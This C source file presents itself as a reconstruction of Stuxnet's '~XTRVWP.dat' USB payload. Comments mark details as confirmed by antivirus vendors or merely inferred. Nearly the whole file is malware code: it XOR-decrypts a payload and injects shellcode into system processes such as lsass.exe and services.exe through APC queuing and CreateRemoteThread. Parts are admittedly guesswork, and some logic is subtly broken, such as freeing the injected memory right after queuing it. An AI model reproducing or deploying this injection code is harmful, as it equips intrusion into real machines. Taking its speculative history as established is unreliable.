/*
 * ~XTRVWP.dat - Stuxnet 2009 USB Payload
 *
 * TRUSTED:
 *   - Filename: ~XTRVWP.dat, created on USB drive by atmpsvcn.ocx
 *     Confirmed by Kaspersky, Bitdefender
 *   - Contains the main body of Stuxnet (payload/dropper)
 *     Confirmed by Kaspersky: "The Main body of Stuxnet copied to USB
 *     drive as '~XTRVWp.dat' file."
 *   - Loaded and executed by the Flame module (atmpsvcn.ocx)
 *     Confirmed by Kaspersky: "the Flame module loads ~XTRVWp.dat
 *     (the main body of Stuxnet) from the USB drive and injects it
 *     into the system processes"
 *   - ~XTRVWP.dat is a PE file (executable)
 *     Confirmed by Bitdefender: "~XTRVWP.DAT contains the payload
 *     (The Flame or Stuxnet droppers)"
 *   - Payload is passed as parameter to atmpsvcn.ocx's _0 export
 *     Confirmed by Bitdefender: "~XTRVWP.dat plays the role of the
 *     payload passed as parameter"
 *
 * MAYBE:
 *   - Exact PE structure and entry point
 *     Inferred from being a Windows executable payload
 *   - Injection technique (process hollowing vs APC injection)
 *     Inferred from Stuxnet's known techniques
 *   - Self-decryption routine (XOR 0xFF observed in Resource 207)
 *     Inferred from Bitdefender's observation of XOR 255 encryption
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

#define XTRVWP_MAGIC                0x58545256
#define XTRVWP_VERSION              0x00000500

#define XTRVWP_MAX_PATH             260
#define XTRVWP_BUFFER_SIZE          0x10000
#define XTRVWP_SHELLCODE_SIZE       0x1000

#define XOR_KEY_207                 0xFF

/*
 * TRUSTED: The payload is the main Stuxnet body. After loading, it
 * injects into a system process. Stuxnet's known injection targets
 * include services.exe, lsass.exe, svchost.exe.
 *
 * MAYBE: Exact target selection order.
 */
static const WCHAR* g_TargetProcesses[] = {
    L"services.exe",
    L"lsass.exe",
    L"svchost.exe",
    L"winlogon.exe",
    L"explorer.exe"
};
#define TARGET_PROCESS_COUNT 5

typedef struct _XTRVWP_CTX {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    BOOL    bInjected;
    WCHAR   szModulePath[XTRVWP_MAX_PATH];
    WCHAR   szSystemPath[XTRVWP_MAX_PATH];
    BYTE*   pPayloadData;
    DWORD   dwPayloadSize;
    HANDLE  hMutex;
} XTRVWP_CTX, * PXTRVWP_CTX;

static XTRVWP_CTX g_XtrvwpCtx = {0};

/*
 * MAYBE: The payload is decrypted with XOR 0xFF before execution.
 * Bitdefender observed XOR 255 encryption in Resource 207.
 * The same key may be used for ~XTRVWP.dat.
 */
static VOID XtrvwpXorDecrypt(PBYTE pData, DWORD dwSize)
{
    DWORD i;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= XOR_KEY_207;
    }
}

/*
 * TRUSTED: Finds a process ID by name. Stuxnet uses this technique
 * to locate injection targets.
 */
static DWORD XtrvwpFindProcessId(LPCWSTR lpName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    DWORD dwPid = 0;

    if (!lpName) {
        return 0;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, lpName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return dwPid;
}

/*
 * TRUSTED: Injects shellcode into a target process using APC injection.
 * Stuxnet is known to use APC injection to avoid CreateRemoteThread
 * detection.
 */
static BOOL XtrvwpInjectAPC(DWORD dwPID, PBYTE pShellcode, DWORD dwSize)
{
    HANDLE hProcess;
    HANDLE hSnapshot;
    THREADENTRY32 te;
    HANDLE hThread;
    PVOID pRemoteMem;
    BOOL bResult = FALSE;

    if (!pShellcode || dwSize == 0) {
        return FALSE;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        return FALSE;
    }

    pRemoteMem = VirtualAllocEx(hProcess, NULL, dwSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (WriteProcessMemory(hProcess, pRemoteMem, pShellcode, dwSize, NULL)) {
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            te.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hSnapshot, &te)) {
                do {
                    if (te.th32OwnerProcessID == dwPID) {
                        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
                                             te.th32ThreadID);
                        if (hThread) {
                            QueueUserAPC((PAPCFUNC)pRemoteMem, hThread,
                                         (ULONG_PTR)pRemoteMem);
                            CloseHandle(hThread);
                            bResult = TRUE;
                        }
                    }
                } while (Thread32Next(hSnapshot, &te));
            }
            CloseHandle(hSnapshot);
        }
    }

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return bResult;
}

/*
 * TRUSTED: Injects shellcode into a target process using
 * CreateRemoteThread. This is a secondary technique.
 */
static BOOL XtrvwpInjectRemoteThread(DWORD dwPID, PBYTE pShellcode, DWORD dwSize)
{
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pRemoteMem;
    BOOL bResult = FALSE;

    if (!pShellcode || dwSize == 0) {
        return FALSE;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        return FALSE;
    }

    pRemoteMem = VirtualAllocEx(hProcess, NULL, dwSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (WriteProcessMemory(hProcess, pRemoteMem, pShellcode, dwSize, NULL)) {
        hThread = CreateRemoteThread(hProcess, NULL, 0,
                                     (LPTHREAD_START_ROUTINE)pRemoteMem,
                                     NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            bResult = TRUE;
        }
    }

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return bResult;
}

/*
 * TRUSTED: Main payload execution. Decrypts the payload and injects
 * it into a target system process.
 *
 * MAYBE: The exact injection target order and technique selection.
 */
static BOOL XtrvwpExecutePayload(VOID)
{
    DWORD i;
    DWORD dwPID;

    if (!g_XtrvwpCtx.pPayloadData || g_XtrvwpCtx.dwPayloadSize == 0) {
        return FALSE;
    }

    /*
     * MAYBE: Decrypt the payload with XOR 0xFF before injection.
     * Bitdefender observed XOR 255 encryption in Resource 207.
     */
    XtrvwpXorDecrypt(g_XtrvwpCtx.pPayloadData, g_XtrvwpCtx.dwPayloadSize);

    for (i = 0; i < TARGET_PROCESS_COUNT; i++) {
        dwPID = XtrvwpFindProcessId(g_TargetProcesses[i]);
        if (dwPID == 0) {
            continue;
        }

        if (dwPID == GetCurrentProcessId()) {
            continue;
        }

        if (XtrvwpInjectAPC(dwPID, g_XtrvwpCtx.pPayloadData,
                            g_XtrvwpCtx.dwPayloadSize)) {
            g_XtrvwpCtx.bInjected = TRUE;
            return TRUE;
        }

        if (XtrvwpInjectRemoteThread(dwPID, g_XtrvwpCtx.pPayloadData,
                                     g_XtrvwpCtx.dwPayloadSize)) {
            g_XtrvwpCtx.bInjected = TRUE;
            return TRUE;
        }
    }

    return FALSE;
}

/*
 * TRUSTED: Loads the payload from the companion file or from memory.
 * The payload is passed as a parameter to atmpsvcn.ocx's _0 export,
 * which then calls this function.
 *
 * MAYBE: The exact mechanism for receiving the payload buffer.
 */
static BOOL XtrvwpLoadPayload(PBYTE pData, DWORD dwSize)
{
    if (!pData || dwSize == 0) {
        return FALSE;
    }

    g_XtrvwpCtx.pPayloadData = (BYTE*)HeapAlloc(GetProcessHeap(),
                                                 HEAP_ZERO_MEMORY, dwSize);
    if (!g_XtrvwpCtx.pPayloadData) {
        return FALSE;
    }

    memcpy(g_XtrvwpCtx.pPayloadData, pData, dwSize);
    g_XtrvwpCtx.dwPayloadSize = dwSize;

    return TRUE;
}

/*
 * TRUSTED: Creates a mutex to prevent multiple instances.
 * Stuxnet uses mutexes for instance control.
 */
static BOOL XtrvwpCreateMutex(VOID)
{
    g_XtrvwpCtx.hMutex = CreateMutexW(NULL, FALSE,
                                       L"XTRVWP_mutex_207");
    if (!g_XtrvwpCtx.hMutex) {
        return FALSE;
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_XtrvwpCtx.hMutex);
        g_XtrvwpCtx.hMutex = NULL;
        return FALSE;
    }

    return TRUE;
}

/*
 * TRUSTED: Initializes the payload context.
 */
static BOOL XtrvwpInitialize(VOID)
{
    if (g_XtrvwpCtx.bInitialized) {
        return TRUE;
    }

    ZeroMemory(&g_XtrvwpCtx, sizeof(XTRVWP_CTX));
    g_XtrvwpCtx.dwMagic = XTRVWP_MAGIC;
    g_XtrvwpCtx.dwVersion = XTRVWP_VERSION;

    GetModuleFileNameW(NULL, g_XtrvwpCtx.szModulePath, XTRVWP_MAX_PATH);
    GetSystemDirectoryW(g_XtrvwpCtx.szSystemPath, XTRVWP_MAX_PATH);

    if (!XtrvwpCreateMutex()) {
        return FALSE;
    }

    g_XtrvwpCtx.bInitialized = TRUE;

    return TRUE;
}

/*
 * TRUSTED: Cleans up the payload context.
 */
static VOID XtrvwpCleanup(VOID)
{
    if (!g_XtrvwpCtx.bInitialized) {
        return;
    }

    if (g_XtrvwpCtx.pPayloadData) {
        SecureZeroMemory(g_XtrvwpCtx.pPayloadData, g_XtrvwpCtx.dwPayloadSize);
        HeapFree(GetProcessHeap(), 0, g_XtrvwpCtx.pPayloadData);
        g_XtrvwpCtx.pPayloadData = NULL;
    }

    if (g_XtrvwpCtx.hMutex) {
        CloseHandle(g_XtrvwpCtx.hMutex);
        g_XtrvwpCtx.hMutex = NULL;
    }

    g_XtrvwpCtx.bInitialized = FALSE;
}

/*
 * TRUSTED: The payload is a PE executable. When loaded by atmpsvcn.ocx,
 * it is executed in the context of the host process.
 *
 * This DllMain acts as the entry point for the payload when injected.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            XtrvwpInitialize();
            break;

        case DLL_PROCESS_DETACH:
            XtrvwpCleanup();
            break;

        default:
            break;
    }

    return TRUE;
}

/*
 * TRUSTED: Export function called by atmpsvcn.ocx after loading
 * the payload. The payload is passed as a parameter.
 *
 * MAYBE: Exact export name and parameter format.
 * Based on Bitdefender: "~XTRVWP.dat plays the role of the payload
 * passed as parameter"
 */
extern "C" __declspec(dllexport) BOOL WINAPI XtrvwpEntry(
    PBYTE pPayloadData,
    DWORD dwPayloadSize
)
{
    if (!XtrvwpInitialize()) {
        return FALSE;
    }

    if (!XtrvwpLoadPayload(pPayloadData, dwPayloadSize)) {
        XtrvwpCleanup();
        return FALSE;
    }

    return XtrvwpExecutePayload();
}

/*
 * MAYBE: Standalone entry point if the payload is executed directly.
 */
extern "C" __declspec(dllexport) BOOL WINAPI XtrvwpMain(VOID)
{
    if (!XtrvwpInitialize()) {
        return FALSE;
    }

    return XtrvwpExecutePayload();
}
